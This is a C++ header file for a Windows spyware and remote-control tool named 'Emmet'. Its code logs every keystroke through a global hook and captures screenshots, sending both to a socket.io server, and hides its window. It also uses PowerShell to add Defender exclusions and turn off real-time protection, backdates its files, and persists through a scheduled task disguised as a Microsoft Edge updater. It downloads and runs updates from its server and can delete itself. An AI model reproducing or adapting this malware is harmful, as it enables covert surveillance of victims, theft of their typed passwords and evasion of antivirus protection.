#pragma once
#pragma warning(disable : 4996)
#pragma comment(lib,"Wininet.lib")
#pragma comment (lib,"gdiplus.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "Mmdevapi.lib")
#include <iostream>
#include <Windows.h>
#include <gdiplus.h>
#include <sio_client.h>
#include <thread>
#include <Urlmon.h>
#include <codecvt>
#include <filesystem>
#include <fstream>
#include <vector>
#include <sstream>
#include <mmsystem.h>
#include <Mmdeviceapi.h>
#include <Endpointvolume.h>

using namespace Gdiplus;

typedef BOOL(WINAPI* SetDebugObjectName_t)(HANDLE, LPCWSTR);

std::string userlc;

bool isLive = false;
bool isTyping = false;
bool alt = false;
bool connected = false; //Connected to server
bool disco = false;

std::vector<std::string> buffer;
std::vector<std::string> strokesPackage;
sio::client client;

int liveDelay = 100;
int discoDelay = 100;
const std::string server = "http://localhost:3000";
const std::string VERSION = "2.5";
const char base64Table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

DWORD GetMP3Duration(const char* filePath)
{
	char cmd[1024];
	sprintf(cmd, "open \"%s\" type MPEGVideo alias mp3", filePath);
	mciSendStringA(cmd, NULL, 0, NULL);

	char durationStr[128];
	mciSendStringA("status mp3 length", durationStr, sizeof(durationStr), NULL);

	DWORD duration = atoi(durationStr);
	mciSendStringA("close mp3", NULL, 0, NULL);
	return duration;
}

void UnmuteSpeakers() 
{
	HRESULT hr;
	IMMDeviceEnumerator* pEnumerator = NULL;
	IMMDevice* pDevice = NULL;
	IAudioEndpointVolume* pVolume = NULL;
	BOOL mute;

	// Initialize COM
	hr = CoInitialize(NULL);
	if (FAILED(hr)) {
		return;
	}

	// Get the enumerator for the audio endpoint devices
	hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
	if (FAILED(hr)) {
		goto Exit;
	}

	// Get the default audio endpoint device
	hr = pEnumerator->GetDefaultAudioEndpoint(eRender, eMultimedia, &pDevice);
	if (FAILED(hr)) {
		goto Exit;
	}

	// Get the endpoint volume interface
	hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void**)&pVolume);
	if (FAILED(hr)) {
		goto Exit;
	}

	// Get the current mute state of the speakers
	hr = pVolume->GetMute(&mute);
	if (FAILED(hr)) {
		goto Exit;
	}

	// Unmute the speakers if they are currently muted
	if (mute) {
		hr = pVolume->SetMute(FALSE, NULL);
		if (FAILED(hr)) {
			goto Exit;
		}
	}

Exit:
	// Release resources
	if (pVolume != NULL) {
		pVolume->Release();
	}
	if (pDevice != NULL) {
		pDevice->Release();
	}
	if (pEnumerator != NULL) {
		pEnumerator->Release();
	}
	CoUninitialize();
}

void SetMaxVolume() 
{
	HRESULT hr;
	IMMDeviceEnumerator* pEnumerator = NULL;
	IMMDevice* pDevice = NULL;
	IAudioEndpointVolume* pVolume = NULL;
	float newVolume = 1.0f; // 100% volume

	// Initialize COM
	hr = CoInitialize(NULL);
	if (FAILED(hr)) {
		return;
	}

	// Get the enumerator for the audio endpoint devices
	hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
	if (FAILED(hr)) {
		goto Exit;
	}

	// Get the default audio endpoint device
	hr = pEnumerator->GetDefaultAudioEndpoint(eRender, eMultimedia, &pDevice);
	if (FAILED(hr)) {
		goto Exit;
	}

	// Get the endpoint volume interface
	hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void**)&pVolume);
	if (FAILED(hr)) {
		goto Exit;
	}

	// Set the master volume level
	hr = pVolume->SetMasterVolumeLevelScalar(newVolume, NULL);
	if (FAILED(hr)) {
		goto Exit;
	}

Exit:
	// Release resources
	if (pVolume != NULL) {
		pVolume->Release();
	}
	if (pDevice != NULL) {
		pDevice->Release();
	}
	if (pEnumerator != NULL) {
		pEnumerator->Release();
	}
	CoUninitialize();
}

void KeepVolume(int duration)
{
	int time = 0;

	while (true)
	{
		UnmuteSpeakers();
		SetMaxVolume();
		Sleep(10);
		time += 10;
		if (time > duration)
		{
			mciSendString(L"close mp3", NULL, 0, NULL);
			break;
		}
	}
}

std::wstring StringToWstring(const std::string& str) {
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	return converter.from_bytes(str);
}

bool IsConnectedToInternet()
{
	const char* command = "ping -n 1 google.com > nul";

	int error = system(command);

	return error == 0;
}

std::string Base64Encode(const std::string& in)
{
	std::string out;

	int val = 0, valb = -6;
	for (unsigned char c : in)
	{
		val = (val << 8) + c;
		valb += 8;
		while (valb >= 0)
		{
			out.push_back("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[(val >> valb) & 0x3F]);
			valb -= 6;
		}
	}
	if (valb > -6)
	{
		out.push_back("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[((val << 8) >> (valb + 8)) & 0x3F]);
	}
	while (out.size() % 4)
	{
		out.push_back('=');
	}

	return out;
}

std::string GetCurrentUsername() {
	char buffer[256];
	DWORD size = sizeof(buffer);
	if (GetUserNameA(buffer, &size)) {
		return std::string(buffer);
	}
	else {
		return "";
	}
}

void PlayMp3(const std::string& filename)
{
	int duration = GetMP3Duration(filename.c_str());

	std::string command = "open \"" + filename + "\" type mpegvideo alias mp3";
	std::wstring editedCommand = StringToWstring(command);
	mciSendString(editedCommand.c_str(), NULL, 0, NULL);

	mciSendString(L"play mp3", NULL, 0, NULL);

	KeepVolume(duration);
}

void ClickAtPosition(int x, int y) 
{
	POINT oldCursorPos;
	GetCursorPos(&oldCursorPos);

	SetCursorPos(x, y);

	INPUT Input = { 0 };
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
	SendInput(1, &Input, sizeof(INPUT));

	ZeroMemory(&Input, sizeof(INPUT));
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
	SendInput(1, &Input, sizeof(INPUT));

	SetCursorPos(oldCursorPos.x, oldCursorPos.y);

	Sleep(100);
}

void PressKey(const std::string& key)
{
	static std::map<std::string, int> keyCodes = {
		{"ENTER", VK_RETURN},
		{"ESCAPE", VK_ESCAPE},
		{"SPACE", VK_SPACE},
		{"TAB", VK_TAB},
		{"BACKSPACE", VK_BACK},
		{"INSERT", VK_INSERT},
		{"DELETE", VK_DELETE},
		{"HOME", VK_HOME},
		{"END", VK_END},
		{"PAGEUP", VK_PRIOR},
		{"PAGEDOWN", VK_NEXT},
		{"UP", VK_UP},
		{"DOWN", VK_DOWN},
		{"LEFT", VK_LEFT},
		{"RIGHT", VK_RIGHT},
		{"F1", VK_F1},
		{"F2", VK_F2},
		{"F3", VK_F3},
		{"F4", VK_F4},
		{"F5", VK_F5},
		{"F6", VK_F6},
		{"F7", VK_F7},
		{"F8", VK_F8},
		{"F9", VK_F9},
		{"F10", VK_F10},
		{"F11", VK_F11},
		{"F12", VK_F12},
		{"SHIFT", VK_SHIFT},
		{"CONTROL", VK_CONTROL},
		{"ALT", VK_LMENU},
	};

	std::vector<std::string> keys;
	std::istringstream iss(key);
	std::string k;
	while (std::getline(iss, k, '+')) {
		keys.push_back(k);
	}

	std::vector<INPUT> inputs(keys.size(), { 0 });
	for (int i = 0; i < keys.size(); ++i) {
		int keyCode;
		auto it = keyCodes.find(keys[i]);
		if (it != keyCodes.end()) {
			keyCode = it->second;
		}
		else {
			keyCode = keys[i][0];
		}

		inputs[i].type = INPUT_KEYBOARD;
		inputs[i].ki.wScan = 0;
		inputs[i].ki.time = 0;
		inputs[i].ki.dwExtraInfo = 0;
		inputs[i].ki.wVk = keyCode;
		inputs[i].ki.dwFlags = KEYEVENTF_EXTENDEDKEY;
	}

	SendInput(inputs.size(), inputs.data(), sizeof(INPUT));

	for (int i = 0; i < inputs.size(); ++i) {
		inputs[i].ki.dwFlags = KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP;
	}

	SendInput(inputs.size(), inputs.data(), sizeof(INPUT));
}

void DiscoModeCDROM()
{
	while (true)
	{
		if (disco)
		{
			MCI_OPEN_PARMS mciOpen;
			mciOpen.lpstrDeviceType = L"cdaudio";
			mciSendCommand(NULL, MCI_OPEN, MCI_OPEN_TYPE, (DWORD)(LPVOID)&mciOpen);
			MCI_SET_PARMS mciSet;
			mciSet.dwTimeFormat = MCI_FORMAT_MILLISECONDS;
			mciSendCommand(mciOpen.wDeviceID, MCI_SET, MCI_SET_TIME_FORMAT, (DWORD)(LPVOID)&mciSet);
			mciSendCommand(mciOpen.wDeviceID, MCI_SET, MCI_SET_DOOR_OPEN, 0);

			Sleep(discoDelay);

			mciSendCommand(mciOpen.wDeviceID, MCI_SET, MCI_SET_DOOR_CLOSED, 0);
			mciSendCommand(mciOpen.wDeviceID, MCI_CLOSE, 0, NULL);
		}
		else
			Sleep(100);
	}
}

void DiscoModeDisplay()
{
	while (true)
	{
		if (disco)
		{
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			Sleep(discoDelay);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
		}
		else
			Sleep(100);
	}
}

std::string toUpper(const std::string& str) {
	std::string result(str.size(), ' ');
	std::transform(str.begin(), str.end(), result.begin(),
		[](unsigned char c) { return std::toupper(c); });
	return result;
}

LRESULT CALLBACK GetKeyBoard(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;

	isTyping = true;

	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
	
	if (p->vkCode == VK_RMENU)
	{
		if (wParam == WM_SYSKEYDOWN)
			alt = true;
		else if (wParam == WM_KEYUP)
			alt = false;
	}

	if (alt)
	{
		switch (p->vkCode)
		{
		case 0x43:
			strokesPackage.push_back("[c']");
			break;
		case 0x4C:
			strokesPackage.push_back("[l']");
			break;
		case 0x4E:
			strokesPackage.push_back("[n']");
			break;
		case 0x4F:
			strokesPackage.push_back("[o']");
			break;
		case 0x53:
			strokesPackage.push_back("[s']");
			break;
		case 0x5A:
			strokesPackage.push_back("[z']");
			break;
		}
	}

	switch (wParam)
	{
	case WM_KEYDOWN:
	{
		DWORD vkCode = pKeyBoard->vkCode;

		if (GetAsyncKeyState(VK_SHIFT))
		{
			switch (vkCode)
			{
			case 0x30:
				strokesPackage.push_back("[)]");
				break;
			case 0x31:
				strokesPackage.push_back("[!]");
				break;
			case 0x32:
				strokesPackage.push_back("[@]");
				break;
			case 0x33:
				strokesPackage.push_back("[#]");
				break;
			case 0x34:
				strokesPackage.push_back("[$]");
				break;
			case 0x35:
				strokesPackage.push_back("[%]");
				break;
			case 0x36:
				strokesPackage.push_back("[^]");
				break;
			case 0x37:
				strokesPackage.push_back("[&]");
				break;
			case 0x38:
				strokesPackage.push_back("[*]");
				break;
			case 0x39:
				strokesPackage.push_back("[(]");
				break;
			case 0xBF:
				strokesPackage.push_back("[?]");
				break;
			case 0xBB:
				strokesPackage.push_back("[+]");
				break;
			case 0xBE:
				strokesPackage.push_back("[<]");
				break;
			case 0xBD:
				strokesPackage.push_back("[_]");
				break;
			case 0xE2:
				strokesPackage.push_back("[>]");
				break;
			case 0x1C:
				strokesPackage.push_back("[VK_CONVERT]");
				break;
			case 0x56:
				strokesPackage.push_back("[@]");
				break;
			case  0x2A:
				strokesPackage.push_back("[PRINT]");
				break;
			case  0x2E:
				strokesPackage.push_back("[Delete]");
				break;
			case 0xAA:
				strokesPackage.push_back("[Search]");
				break;
			case  0xF2:
				strokesPackage.push_back("[Copy]");
				break;
			case 0xFE:
				strokesPackage.push_back("[Clear]");
				break;
			case  0x3:
				strokesPackage.push_back("[Connect]");
				break;
			case 0x6:
				strokesPackage.push_back("[Logoff]");
				break;
			}
		}
		else
		{
			switch (vkCode)
			{
			case 0x30:
				strokesPackage.push_back("0");
				break;
			case 0x31:
				strokesPackage.push_back("1");
				break;
			case 0x32:
				strokesPackage.push_back("2");
				break;
			case 0x33:
				strokesPackage.push_back("3");
				break;
			case 0x34:
				strokesPackage.push_back("4");
				break;
			case 0x35:
				strokesPackage.push_back("5");
				break;
			case 0x36:
				strokesPackage.push_back("6");
				break;
			case 0x37:
				strokesPackage.push_back("7");
				break;
			case 0x38:
				strokesPackage.push_back("8");
				break;
			case 0x39:
				strokesPackage.push_back("9");
				break;
			case 0xBF:
				strokesPackage.push_back("/");
				break;
			case 0xBB:
				strokesPackage.push_back("=");
				break;
			case 0xBC:
				strokesPackage.push_back(",");
				break;
			case 0xBE:
				strokesPackage.push_back(".");
				break;
			case 0xBD:
				strokesPackage.push_back("-");
				break;
			case 0xE2:
				strokesPackage.push_back("<");
				break;
			}
		}
		if (!(GetAsyncKeyState(VK_SHIFT)))
		{
			switch (vkCode)
			{
			case 0x41:
				strokesPackage.push_back("a");
				break;
			case 0x42:
				strokesPackage.push_back("b");
				break;
			case 0x43:
				strokesPackage.push_back("c");
				break;
			case 0xBA:
				strokesPackage.push_back("č");
				break;
			case 0x44:
				strokesPackage.push_back("d");
				break;
			case 0x45:
				strokesPackage.push_back("e");
				break;
			case 0x46:
				strokesPackage.push_back("f");
				break;
			case 0x47:
				strokesPackage.push_back("g");
				break;
			case 0x48:
				strokesPackage.push_back("h");
				break;
			case 0x49:
				strokesPackage.push_back("i");
				break;
			case 0x4A:
				strokesPackage.push_back("j");
				break;
			case 0x4B:
				strokesPackage.push_back("k");
				break;
			case 0x4C:
				strokesPackage.push_back("l");
				break;
			case 0x4D:
				strokesPackage.push_back("m");
				break;
			case 0x4E:
				strokesPackage.push_back("n");
				break;
			case 0x4F:
				strokesPackage.push_back("o");
				break;
			case 0x50:
				strokesPackage.push_back("p");
				break;
			case 0x52:
				strokesPackage.push_back("r");
				break;
			case 0x53:
				strokesPackage.push_back("s");
				break;
			case 0x54:
				strokesPackage.push_back("t");
				break;
			case 0x55:
				strokesPackage.push_back("u");
				break;
			case 0x56:
				strokesPackage.push_back("v");
				break;
			case 0x5A:
				strokesPackage.push_back("z");
				break;
			case 0xDC:
				strokesPackage.push_back("\\");
				break;
			case 0x51:
				strokesPackage.push_back("q");
				break;
			case 0x57:
				strokesPackage.push_back("w");
				break;
			case 0x59:
				strokesPackage.push_back("y");
				break;
			case 0x58:
				strokesPackage.push_back("x");
				break;
			case 0xDE:
				strokesPackage.push_back("ć");
				break;
			case 0xDD:
				strokesPackage.push_back("đ");
				break;
			default:
				strokesPackage.push_back(" ");
			}
		}

		if ((GetAsyncKeyState(VK_SHIFT)))
		{
			switch (vkCode)
			{
			case 0x41:
				strokesPackage.push_back("A");
				break;
			case 0x42:
				strokesPackage.push_back("B");
				break;
			case 0x43:
				strokesPackage.push_back("C");
				break;
			case 0xBA:
				strokesPackage.push_back("č");
				break;
			case 0x44:
				strokesPackage.push_back("D");
				break;
			case 0x45:
				strokesPackage.push_back("E");
				break;
			case 0x46:
				strokesPackage.push_back("F");
				break;
			case 0x47:
				strokesPackage.push_back("G");
				break;
			case 0x48:
				strokesPackage.push_back("H");
				break;
			case 0x49:
				strokesPackage.push_back("I");
				break;
			case 0x4A:
				strokesPackage.push_back("J");
				break;
			case 0x4B:
				strokesPackage.push_back("K");
				break;
			case 0x4C:
				strokesPackage.push_back("L");
				break;
			case 0x4D:
				strokesPackage.push_back("M");
				break;
			case 0x4E:
				strokesPackage.push_back("N");
				break;
			case 0x4F:
				strokesPackage.push_back("O");
				break;
			case 0x50:
				strokesPackage.push_back("P");
				break;
			case 0x52:
				strokesPackage.push_back("R");
				break;
			case 0x53:
				strokesPackage.push_back("S");
				break;
			case 0x54:
				strokesPackage.push_back("T");
				break;
			case 0x55:
				strokesPackage.push_back("U");
				break;
			case 0x56:
				strokesPackage.push_back("V");
				break;
			case 0x5A:
				strokesPackage.push_back("Z");
				break;
			case 0x51:
				strokesPackage.push_back("Q");
				break;
			case 0x57:
				strokesPackage.push_back("W");
				break;
			case 0x59:
				strokesPackage.push_back("Y");
				break;
			case 0x58:
				strokesPackage.push_back("X");
				break;
			default:
				strokesPackage.push_back(" ");
			}
		}

		switch (vkCode)
		{
		case VK_SPACE:
			strokesPackage.push_back("[Space]");
			break;
		case 0x2E:
			strokesPackage.push_back("[Delete]");
			break;
		case VK_BACK:
			strokesPackage.push_back("[BackSpace]");
			break;
		case VK_RETURN:
			strokesPackage.push_back("[Enter]");
			break;
		case VK_LCONTROL:
			strokesPackage.push_back("[Ctrl]");
			break;
		case VK_RCONTROL:
			strokesPackage.push_back("[Ctrl]");
			break;
		case VK_TAB:
			strokesPackage.push_back("[Tab]");
			break;
		case 0x25:
			strokesPackage.push_back("[<]");
			break;
		case 0x26:
			strokesPackage.push_back("[^]");
			break;
		case 0x27:
			strokesPackage.push_back("[>]");
			break;
		case 0x28:
			strokesPackage.push_back("[DownArrow]");
			break;
		case VK_ESCAPE:
			strokesPackage.push_back("[Esc]");
			break;
		case VK_CAPITAL:
			strokesPackage.push_back("[Caps Lock]");
			break;
		case VK_RSHIFT:
			strokesPackage.push_back("[Right Shift]");
			break;
		case VK_LSHIFT:
			strokesPackage.push_back("[LShift]");
			break;
		case VK_LMENU:
			strokesPackage.push_back("[LAlt]");
			break;
		case VK_RMENU:
			strokesPackage.push_back("[RAlt]");
			break;
		case VK_LWIN:
			strokesPackage.push_back("[LWin]");
			break;
		case VK_RWIN:
			strokesPackage.push_back("[RWin]");
			break;
		case VK_INSERT:
			strokesPackage.push_back("[Insert]");
			break;
		case VK_SCROLL:
			strokesPackage.push_back("[Scroll Lock]");
			break;
		case VK_HOME:
			strokesPackage.push_back("[Home]");
			break;
		case VK_END:
			strokesPackage.push_back("[End]");
			break;
		case VK_PRIOR:
			strokesPackage.push_back("[Page Up]");
			break;
		case VK_NEXT:
			strokesPackage.push_back("[Page Down]");
			break;
		case VK_SNAPSHOT:
			strokesPackage.push_back("[Print Screen]");
			break;
		case VK_OEM_3:
			strokesPackage.push_back("[ ~ ` ]");
			break;
		case VK_OEM_4:
			strokesPackage.push_back("[ { [ ]");
			break;
		case VK_OEM_6:
			strokesPackage.push_back("[ } ] ]");
			break;
		case VK_OEM_1:
			strokesPackage.push_back("[ : ; ]");
			break;
		case VK_OEM_7:
			strokesPackage.push_back("[ \" ' ]");
			break;
		case VK_F1:
			strokesPackage.push_back("[F1]");
			break;
		case VK_F2:
			strokesPackage.push_back("[F2]");
			break;
		case VK_F3:
			strokesPackage.push_back("[F3]");
			break;
		case VK_F4:
			strokesPackage.push_back("[F4]");
			break;
		case VK_F5:
			strokesPackage.push_back("[F5]");
			break;
		case VK_F6:
			strokesPackage.push_back("[F6]");
			break;
		case VK_F7:
			strokesPackage.push_back("[F7]");
			break;
		case VK_F8:
			strokesPackage.push_back("[F8]");
			break;
		case VK_F9:
			strokesPackage.push_back("[F9]");
			break;
		case VK_F10:
			strokesPackage.push_back("[F10]");
			break;
		case VK_F11:
			strokesPackage.push_back("[F11]");
			break;
		case VK_F12:
			strokesPackage.push_back("[F12]");
			break;
		case VK_NUMPAD0:
			strokesPackage.push_back("0");
			break;
		case VK_NUMPAD1:
			strokesPackage.push_back("1");
			break;
		case VK_NUMPAD2:
			strokesPackage.push_back("2");
			break;
		case VK_NUMPAD3:
			strokesPackage.push_back("3");
			break;
		case VK_NUMPAD4:
			strokesPackage.push_back("4");
			break;
		case VK_NUMPAD5:
			strokesPackage.push_back("5");
			break;
		case VK_NUMPAD6:
			strokesPackage.push_back("6");
			break;
		case VK_NUMPAD7:
			strokesPackage.push_back("7");
			break;
		case VK_NUMPAD8:
			strokesPackage.push_back("8");
			break;
		case VK_NUMPAD9:
			strokesPackage.push_back("9");
			break;
		case 0x6F:
			strokesPackage.push_back("[/]");
			break;
		case 0x6A:
			strokesPackage.push_back("[*]");
			break;
		case 0x6D:
			strokesPackage.push_back("[-]");
			break;
		case 0x6B:
			strokesPackage.push_back("[+]");
			break;
		case 0x6E:
			strokesPackage.push_back("[,]");
			break;
		}
	}
	case WM_SYSKEYDOWN:
	{
		DWORD vkCode = pKeyBoard->vkCode;

		if (GetAsyncKeyState(VK_RSHIFT))
		{
			switch (vkCode)
			{
			case 0x51:
				strokesPackage.push_back("[\\]");
				break;
			case 0x57:
				strokesPackage.push_back("[|]");
				break;
			case 0xDB:
				strokesPackage.push_back("[{]");
				break;
			case 0xDD:
				strokesPackage.push_back("[}]");
				break;
			case 0xDC:
				strokesPackage.push_back("[|]");
				break;
			case 0x56:
				strokesPackage.push_back("[@]");
				break;
			case 0xBE:
				strokesPackage.push_back("[>]");
				break;
			}
		}
	}
	}
	return 0;
}

void Checker()
{
	int counter = 0;

	while (true)
	{
		if (isTyping)
			counter = 0;

		counter += 1;
		Sleep(1000);

		if (counter > 4 && strokesPackage.size() > 0)
			if (!isTyping)
			{
				//Send message to server if computer has internet connection
				if (IsConnectedToInternet && connected)
				{
					std::string message;

					//Add old strokes
					for (std::string key : buffer)
					{
						message += key;
					}

					//Add actual strokes
					for (std::string key : strokesPackage)
					{
						message += key;
					}

					std::cout << message << std::endl;

					client.socket()->emit("logs", message);

					message.clear();
					strokesPackage.clear();
					buffer.clear();
				}
				else //If not connected to internet add actual strokes to buffer for later use
					buffer.insert(buffer.end(), strokesPackage.begin(), strokesPackage.end());

				counter = 0;
			}

		isTyping = false;
	}
}

void Screenshot()
{
	ULONG_PTR gdiplustoken;
	GdiplusStartupInput gdistartupinput;
	GdiplusStartupOutput gdistartupoutput;

	gdistartupinput.SuppressBackgroundThread = true;
	GdiplusStartup(&gdiplustoken, &gdistartupinput, &gdistartupoutput);

	HDC dc = GetDC(GetDesktopWindow());
	HDC dc2 = CreateCompatibleDC(dc);

	RECT rc0kno;

	GetClientRect(GetDesktopWindow(), &rc0kno);
	int w = rc0kno.right - rc0kno.left;
	int h = rc0kno.bottom - rc0kno.top;

	HBITMAP hbitmap = CreateCompatibleBitmap(dc, w, h);
	HBITMAP holdbitmap = (HBITMAP)SelectObject(dc2, hbitmap);

	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);
	std::unique_ptr<Bitmap> bm(new Bitmap(hbitmap, NULL));

	int newWidth = w / 2;
	int newHeight = h / 2;
	std::unique_ptr<Image> thumbnail(bm->GetThumbnailImage(newWidth, newHeight, NULL, NULL));

	UINT num;
	UINT size;

	ImageCodecInfo* imagecodecinfo;
	GetImageEncodersSize(&num, &size);

	imagecodecinfo = (ImageCodecInfo*)(malloc(size));
	GetImageEncoders(num, size, imagecodecinfo);

	CLSID clsidEncoder;

	IStream* stream;
	CreateStreamOnHGlobal(NULL, TRUE, &stream);

	for (int i = 0; i < num; i++)
	{
		if (wcscmp(imagecodecinfo[i].MimeType, L"image/jpeg") == 0)
			clsidEncoder = imagecodecinfo[i].Clsid;
	}

	free(imagecodecinfo);

	thumbnail->Save(stream, &clsidEncoder);

	LARGE_INTEGER zero;
	zero.QuadPart = 0;
	stream->Seek(zero, STREAM_SEEK_SET, NULL);

	const int bufferSize = 65536;
	BYTE buffer[bufferSize];
	ULONG bytesRead;

	std::vector<BYTE> data;
	while (true)
	{
		stream->Read(buffer, bufferSize, &bytesRead);
		if (bytesRead == 0)
			break;

		data.insert(data.end(), buffer, buffer + bytesRead);
	}

	std::string base64;
	base64.reserve((data.size() * 4) / 3 + 3);
	int i = 0;
	while (i < data.size())
	{
		BYTE b1 = data[i++];
		BYTE b2 = (i < data.size()) ? data[i++] : 0;
		BYTE b3 = (i < data.size()) ? data[i++] : 0;
		BYTE c1 = b1 >> 2;
		BYTE c2 = ((b1 & 0x03) << 4) | (b2 >> 4);
		BYTE c3 = ((b2 & 0x0F) << 2) | (b3 >> 6);
		BYTE c4 = b3 & 0x3F;

		base64 += base64Table[c1];
		base64 += base64Table[c2];
		base64 += (i > data.size()) ? '=' : base64Table[c3];
		base64 += (i > data.size()) ? '=' : base64Table[c4];
	}

	data.clear();
	stream->Release();
	thumbnail.reset();
	bm.reset();

	SelectObject(dc2, holdbitmap);
	DeleteObject(dc2);
	DeleteObject(hbitmap);
	DeleteObject(holdbitmap);
	ReleaseDC(GetDesktopWindow(), dc);

	client.socket()->emit("screenshotResult", base64);
	base64.clear();
	data.clear();
}

void HideWindow()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	SetConsoleTitle(L" ");
	SetWindowText(GetConsoleWindow(), L" ");

	HWND hwnd = GetConsoleWindow();

	SetWindowLong(hwnd, GWL_EXSTYLE, WS_EX_TOOLWINDOW);

	SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
}

void RunDeleteEmmetBat(std::string filePath)
{
	std::ofstream o;
	o.open("destruct.bat");
	o << ":loop\ndel \"" << filePath << "\"\nif exist \"" << filePath << "\" goto loop\n\ndel \"%~f0\"\ & exit";
	o.close();

	system("destruct.bat");
}

void SelfDestruct(std::string processName, std::string filePath)
{
	std::thread deleteBat(RunDeleteEmmetBat, filePath);
	system(std::string("taskkill /F /IM " + processName).c_str());
}

void InstallEmmetBat(std::string path, std::string wantedDir)
{
	std::string onlyDirectory = "";
	
	const size_t last_slash_idx = wantedDir.rfind('\\');
	if (std::string::npos != last_slash_idx)
	{
		onlyDirectory = wantedDir.substr(0, last_slash_idx);
	}

	//New dir
	std::string command = "powershell.exe -Command \"New-Item -ItemType Directory -Path \"" + onlyDirectory + "\" -Force\"";
	system(command.c_str());
	std::cout << "New directory created. OK." << std::endl;

	//Anti Virus
	std::string addDownloadsException = "Powershell.exe -Command \"Add-MpPreference -ExclusionPath \"C:\\Users\\" + GetCurrentUsername() + "\\Downloads\"\"";
	system(addDownloadsException.c_str());

	std::string addFileException = "Powershell.exe -Command \"Add-MpPreference -ExclusionPath \"" + wantedDir + "\"\"";
	system(addFileException.c_str());
	std::cout << "Exceptions added. OK" << std::endl;

	std::string addFolderException = "Powershell.exe -Command \"Add-MpPreference -ExclusionPath \"" + onlyDirectory + "\"\"";
	system(addFolderException.c_str());
	std::cout << "Exceptions added. OK" << std::endl;

	std::string disableAntiVirus = "Powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"";
	system(disableAntiVirus.c_str());

	//File copying
	std::string moveToLocation = "Powershell.exe -Command \"Copy-Item " + path + " -Destination " + wantedDir +"\"";
	system(moveToLocation.c_str());
	std::cout << "Moved to new location. OK" << std::endl;

	std::string changeTime = "Powershell.exe -Command \"Get-ChildItem -Path \"" + wantedDir + "\" -Recurse | ForEach-Object { $_.LastWriteTime = Get-Date '14 August 2016 13:14 : 00' }\"";
	system(changeTime.c_str());
	std::cout << "Time changed. OK" << std::endl;

	//Scheduler
	std::string scheduler = "Powershell.exe -Command \"$action = New-ScheduledTaskAction -Execute \"" + wantedDir + "\"; $trigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName 'MicrosoftEdgeUpdateCoreTask' -Action $action -Trigger $trigger -Force\"";
	system(scheduler.c_str());
	std::cout << "Added to scheduler. OK" << std::endl;

	//Running new emmet
	std::string runNewEmmet = "powershell.exe -Command \"Start-Process \"" + wantedDir + "\"\"";
	system(runNewEmmet.c_str());
	std::cout << "Started new exe. OK" << std::endl;
}

void UpdateBat(std::string actualFileName, std::string dir)
{
	std::ofstream o;
	o.open("update.bat");
	o << "taskkill /F /IM " + actualFileName;
	o << "\ndel \"" + dir + "\"\\" + actualFileName;
	o << "\nren \"" + dir + "\"\\z.exe " + actualFileName;
	o << "\nstart \"\" \"" + dir + "\"\\" + actualFileName;
	o << "\ndel \"%~f0\"\ & exit";
	o.close();

	system("start update.bat");
}

void Update(std::string actualFileName, std::string dir)
{
	std::wstring fileOnServer = L"http://localhost:3000/ftp/EmmetPROD.exe";

	std::string destinationFile = dir + "\\z.exe";

	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring wString = converter.from_bytes(destinationFile);
	LPCWSTR lpcwstrFile = wString.c_str();

	HRESULT result = URLDownloadToFile(NULL, fileOnServer.c_str(), lpcwstrFile, 0, NULL);

	if (result == S_OK)
	{
		std::thread updateBat(UpdateBat, actualFileName, dir);

		std::string killEmmet = "taskkill /F /IM " + actualFileName;
		system(killEmmet.c_str());
	}
	else {
		std::cout << "File download failed" << std::endl;
	}
}

void GoLive()
{
	while (true)
	{
		if (isLive)
		{
			Sleep(liveDelay);			
			Screenshot();
		}
		else {
			Sleep(1000);
		}
	}
}